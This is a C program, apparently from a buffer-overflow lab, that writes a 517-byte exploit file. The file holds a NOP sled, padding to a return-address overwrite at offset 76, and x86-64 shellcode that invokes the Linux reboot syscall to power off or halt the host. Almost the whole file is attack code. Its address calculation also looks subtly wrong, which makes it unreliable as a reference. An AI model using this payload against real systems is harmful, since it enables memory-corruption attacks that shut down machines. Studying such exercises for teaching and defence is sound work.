//The goal of this code is to create contents of the malicious file. This is a partial code. You need to complete it. 
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
const char code[] =
	"\xba\xdc\xfe\x21\x43"  // mov    $0x4321fedc,%edx
    "\xbe\x69\x19\x12\x28"  // mov    $0x28121969,%esi
    "\xbf\xad\xde\xe1\xfe"  // mov    $0xfee1dead,%edi
    "\xb0\xa9"              // mov    $0xa9,%al
    "\x0f\x05";

void main(int argc, char **argv)
{
	char buffer[517];
	FILE * malfile;
	/* Initialize buffer with 0x90 (NOP instruction) */
	
	memset(&buffer, 0x90, 517);
	memset(&buffer, 0x41, 76);
	
	/* You need to fill the buffer with appropriate contents here */
	memcpy(&buffer[517-sizeof(code)],code,sizeof(code));

	long malAddress=(long *)&buffer + 100;
	long* returnPTR=(long *)(buffer + 76);
	*returnPTR=malAddress;

	/* Save the contents to the file "MalFile" */
	malfile = fopen("./malfile", "w");
	fwrite(buffer, 517, 1, malfile);
	fclose(malfile);
}
